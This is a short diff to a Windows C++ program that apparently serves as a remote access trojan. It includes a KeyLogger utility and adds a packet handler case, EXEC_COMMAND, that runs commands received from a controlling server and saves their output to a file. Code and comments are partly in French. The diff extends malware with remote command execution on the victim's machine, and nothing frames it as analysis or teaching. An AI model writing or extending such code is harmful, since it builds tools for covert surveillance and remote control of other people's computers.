@@ -7,6 +7,7 @@
 #include "../utils/SystemInfo.hpp"
 #include "../utils/TaskList.hpp"
 #include "../utils/KeyLogger.hpp"
+#include "../utils/BashExec.hpp"
 #include <iostream>
 #include <windows.h>
 #include <thread>
@@ -82,6 +83,16 @@ void serverRequestHandler() {
 
                     break;
                 }
+
+
+
+                case PacketType::EXEC_COMMAND: {
+                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
+                    BashExec exec;
+                    BashExec::executeToFile(cmd, "exec_output.txt");
+                    break;
+                }
+
                 
                 default:
                     cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << endl;
